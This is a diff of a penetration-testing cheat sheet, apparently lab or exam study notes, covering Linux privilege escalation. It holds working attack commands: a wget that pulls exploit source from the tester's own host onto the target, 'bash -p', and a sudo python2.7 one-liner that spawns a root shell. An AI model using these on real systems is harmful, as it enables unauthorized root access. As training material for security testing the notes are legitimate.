@@ -37,6 +37,7 @@
   - if you are getting the size same of all use filter size and give the size there.
  
 - ## Privilege escalation <a name="privilegeescalation"></a>
+
 - Use ```linpeas``` if you are not getting any escalation
   - download the script from the github
 - If It was running on Linux Kernel 4.4.0–31-generic and Ubuntu 14.04.5 LTS. use below command
@@ -47,7 +48,7 @@
   - run ```sudo python -m http.server 80```
   - download the file in the target system ```wget http://<myip>/<filename>```
   - example: wget http://192.168.45.161/root.cpp
- 
+ - ```bash -p```
 - if you find ```/usr/bin/python2.7``` in sudo -l
   - then use the below command it will give you the root privilege
   - ```/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
